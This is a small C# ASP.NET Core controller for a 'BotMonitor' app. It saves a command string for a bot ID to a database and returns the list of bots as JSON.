using System.Linq;
using BotMonitor.Data;
using Microsoft.AspNetCore.Mvc;
using System.Threading.Tasks;
using BotMonitor.Models;
using Microsoft.EntityFrameworkCore;

namespace BotMonitor.Controllers
{
    public class HomeController : Controller
    {
        public IActionResult Index() => View();

        [HttpPost]
        public async Task IssueInstruction(byte botId, string command)
        {
            using (var db = new BotContext())
            {
                var instruction = await db.Instructions.FirstOrDefaultAsync(i => i.BotId == botId);

                if (instruction == null)
                {
                    instruction = new Instruction
                    {
                        BotId = botId
                    };
                    await db.Instructions.AddAsync(instruction);
                }

                instruction.Command = command;
                await db.SaveChangesAsync();
            }
        }

        [HttpGet]
        public async Task<JsonResult> GetData()
        {
            using (var db = new BotContext())
            {
                var bots = await db.Bots.ToListAsync();
                return Json(bots.Select(b => new ViewModels.Bot(b)));
            }
        }
    }
}
